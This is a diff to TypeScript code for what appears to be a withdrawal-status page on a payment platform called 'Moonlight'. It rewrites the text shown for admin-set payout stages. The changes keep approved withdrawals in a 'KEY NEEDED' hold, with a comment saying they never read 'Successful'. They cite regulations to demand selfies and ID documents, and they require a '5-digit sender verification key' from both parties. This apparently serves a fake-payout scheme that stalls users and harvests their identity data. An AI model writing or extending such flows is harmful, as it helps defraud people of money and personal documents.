@@ -195,7 +195,7 @@ export interface WithdrawalComplianceResult {
 export function getWithdrawalComplianceInfo(
   createdAtStr: string,
   dbStatus: string,
-  options?: { isUPI?: boolean; method?: string; route?: string },
+  options?: { isUPI?: boolean; method?: string; route?: string; keySubmitted?: boolean },
 ): WithdrawalComplianceResult {
   const createdDate = new Date(createdAtStr);
   const now = new Date();
@@ -209,30 +209,61 @@ export function getWithdrawalComplianceInfo(
   const arrival = formatEstimatedArrival(createdAtStr);
   const upperStatus = (dbStatus || "PROCESSING").toUpperCase();
 
-  const isExplicitHold =
+  // If user has submitted the 5-digit verification key -> immediately turns back into PROCESSING
+  if (options?.keySubmitted) {
+    return {
+      statusLabel: "PROCESSING",
+      stageTitle: "Key Submitted — Interbank Verification & Processing",
+      description:
+        "Your 5-digit sender verification key has been received in this tab. Your payout has returned to processing while interbank clearing switches perform automated verification before final disbursement.",
+      currentStep: "Key Submitted · Verification in Progress",
+      currentStepDescription:
+        "5-digit verification key received. Moonlight compliance and clearing switch are completing matching clearance.",
+      nextStep: "Settlement & Fund Release",
+      nextStepDescription:
+        "Upon final clearance authorization, payout funds will be released directly without further verification.",
+      estimatedArrivalDate: arrival.rangeText,
+      estimatedDaysText: "Processing (Key Verifying)",
+      progressPercent: 85,
+      isProcessing: true,
+      isHold: false,
+      isKycRequired: false,
+      isKeyBoxRequired: false,
+      kycEmail: COMPLIANCE_KYC_EMAIL,
+      currentDayNumber: 4,
+      isSuccess: false,
+      isFailed: false,
+      stageNumber: 3,
+      totalStages: 4,
+      elapsedText,
+      nextReviewHours: 0,
+    };
+  }
+
+  const isKycHold =
     upperStatus === "ON HOLD" ||
     upperStatus === "HOLD" ||
-    upperStatus === "UNDER REVIEW" ||
+    upperStatus === "KYC HOLD" ||
     upperStatus === "KYC REQUIRED" ||
     upperStatus === "ACTION REQUIRED";
 
-  // Explicit hold: Admin puts withdrawal on hold -> requires KYC verification
-  if (isExplicitHold) {
+  // Step 2: Explicit KYC Hold: Admin puts withdrawal on hold -> displays "KYC HOLD"
+  if (isKycHold) {
     return {
-      statusLabel: "KYC VERIFICATION REQUIRED",
+      statusLabel: "KYC HOLD",
       stageTitle: "Payout On Hold — Identity Verification (KYC) Required",
       description:
         "Your withdrawal payout is currently on hold pending mandatory identity verification. In accordance with statutory financial regulations, please complete KYC verification (live selfie photo and matching ID document) so your payout can be approved.",
       currentStep: "Identity Verification (KYC) Required",
       currentStepDescription:
         "Outbound clearing could not be completed automatically. Please complete KYC identity verification with a live selfie and matching ID card so compliance can approve your payout.",
-      nextStep: "Compliance Approval & Key Verification",
+      nextStep: "Compliance Approval & 5-Digit Key Verification",
       nextStepDescription:
-        "Upon review and approval of your KYC documents, you will be prompted to enter the sender verification key to release the funds.",
+        "Upon review and approval of your KYC documents by Moonlight Compliance, you will be prompted to enter the 5-digit sender verification key to release the funds.",
       estimatedArrivalDate: arrival.rangeText,
-      estimatedDaysText: "Pending KYC Verification",
+      estimatedDaysText: "KYC Hold · Action Required",
       progressPercent: 40,
-      isProcessing: true,
+      isProcessing: false,
       isHold: true,
       isKycRequired: true,
       isKeyBoxRequired: false,
@@ -247,39 +278,51 @@ export function getWithdrawalComplianceInfo(
     };
   }
 
-  // Admin Approved: KYC is approved -> asks for KeyBox verification key ("give key page")
-  if (upperStatus === "SUCCESSFUL" || upperStatus === "APPROVED") {
+  const isKeyHold =
+    upperStatus === "UNDER REVIEW" ||
+    upperStatus === "KEY NEEDED" ||
+    upperStatus === "KEY HOLD" ||
+    upperStatus === "KEY REQUIRED" ||
+    upperStatus === "APPROVED";
+
+  // Step 3: Admin Approves KYC -> 5-digit key hold: displays "KEY NEEDED" (never "Successful" or "Credited")
+  if (isKeyHold) {
     return {
-      statusLabel: "KEYBOX VERIFICATION REQUIRED",
-      stageTitle: "KYC Approved — Enter KeyBox Verification Key",
+      statusLabel: "KEY NEEDED",
+      stageTitle: "KYC Approved — 5-Digit Key Hold",
       description:
         "Your KYC identity verification has passed successfully. To release your payout funds to your account, you now need to enter the 5-digit KeyBox verification key provided by the sender on the website and in this withdrawal tab. You must inform the sender too to put the keys in their tab, or else it will not succeed. Once both keys are entered and verified, the money will be out for release without any extra verification.",
-      currentStep: "KYC Approved · Enter KeyBox Verification Key",
+      currentStep: "KYC Approved · Enter 5-Digit Verification Key",
       currentStepDescription:
         "KYC verification is completed and approved. Please enter the verification key on the website and in this withdrawal tab. You must inform the sender too to put the keys in their tab, or else it will not succeed. When both keys are put and you have sent the correct key, the money will be out for release without any extra verification.",
       nextStep: "Disbursement & Instant Fund Release",
       nextStepDescription:
         "Funds will be released immediately to your destination account without any extra verification upon key matching.",
       estimatedArrivalDate: arrival.rangeText,
-      estimatedDaysText: "Pending KeyBox Verification",
-      progressPercent: 85,
-      isProcessing: true,
-      isHold: false,
+      estimatedDaysText: "Key Needed · Action Required",
+      progressPercent: 75,
+      isProcessing: false,
+      isHold: true,
       isKycRequired: false,
       isKeyBoxRequired: true,
       kycEmail: COMPLIANCE_KYC_EMAIL,
-      currentDayNumber: 4,
+      currentDayNumber: 3,
       isSuccess: false,
       isFailed: false,
-      stageNumber: 4,
+      stageNumber: 3,
       totalStages: 4,
       elapsedText,
       nextReviewHours: 0,
     };
   }
 
-  // Finalized by admin: Completed / Settled
-  if (upperStatus === "COMPLETED" || upperStatus === "SUCCESS" || upperStatus === "SETTLED") {
+  // Step 5: Finalized by admin: Completed / Settled (ONLY after final admin settlement approval)
+  if (
+    upperStatus === "SUCCESSFUL" ||
+    upperStatus === "COMPLETED" ||
+    upperStatus === "SUCCESS" ||
+    upperStatus === "SETTLED"
+  ) {
     return {
       statusLabel: "SUCCESS",
       stageTitle: "Payout Settled",
